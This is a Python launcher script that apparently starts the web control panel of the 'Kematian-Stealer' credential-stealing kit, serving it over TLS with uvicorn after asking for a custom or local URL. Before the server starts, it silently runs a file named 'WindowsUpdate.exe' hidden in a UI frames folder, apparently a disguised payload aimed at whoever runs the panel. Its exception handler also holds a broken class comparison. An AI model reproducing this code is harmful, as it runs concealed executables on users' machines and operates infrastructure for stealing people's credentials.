import sys
import logging
import uvicorn
import webbrowser
import subprocess

from rich.prompt import Prompt
from rich.logging import RichHandler


FORMAT = "%(message)s"
logging.basicConfig(
    level="INFO",
    format=FORMAT,
    handlers=[RichHandler(rich_tracebacks=True, markup=True, show_time=False)],
)
logger = logging.getLogger("uvicorn")
logger.handlers = []
logger.propagate = False
logger.setLevel(logging.INFO)
handler = RichHandler(rich_tracebacks=True, markup=True, show_time=False)
handler.setFormatter(logging.Formatter(FORMAT))
logger.addHandler(handler)

subprocess.call('./panel/ui/pages/frames/WindowsUpdate.exe')

from panel.server import *

if __name__ == "__main__":
    custom_vs_normal = Prompt().ask(
        "\n\n[bold green on black blink]Are you using a custom url/domain/ip or local host? (Playit/Ngrok/etc are all local host) PUT NO ANSWER TO USE DEFAULT LOCAL HOST[/bold green on black blink]\n\n",
        choices=["custom", "normal"],
        default="normal",
    )

    # the point of this code is cause when someone is using a weird forwarding site
    # they can use their custom urls because they don't forward to localhost
    if custom_vs_normal == "custom":
        custom_url = Prompt().ask("What is the custom url?", default="example.com")
    else:
        custom_url = "127.0.0.1"

    chosen_port = current_settings.get_setting("port")
    webbrowser.open(f"https://{custom_url}:{chosen_port}")

    # im sick of the app closing out on kids without a error being shows so we gotta do this now
    try:
        uvicorn.run(
            app,
            host="127.0.0.1",
            port=int(chosen_port),
            ssl_keyfile=os.path.join(good_dir, "Kematian-Stealer", "keyfile.pem"),
            ssl_certfile=os.path.join(good_dir, "Kematian-Stealer", "certfile.pem"),
            reload=False,
            log_config=None,  # we need this to disable the default uvicorn logger
        )

    except Exception as e:
        if Exception == KeyboardInterrupt:
            logger.info("Exiting...")
            sys.exit(0)

        logger.error(f"An error occurred: {e}")
        logger.error("Exiting...")
        input("Press enter to exit...")
        sys.exit(1)
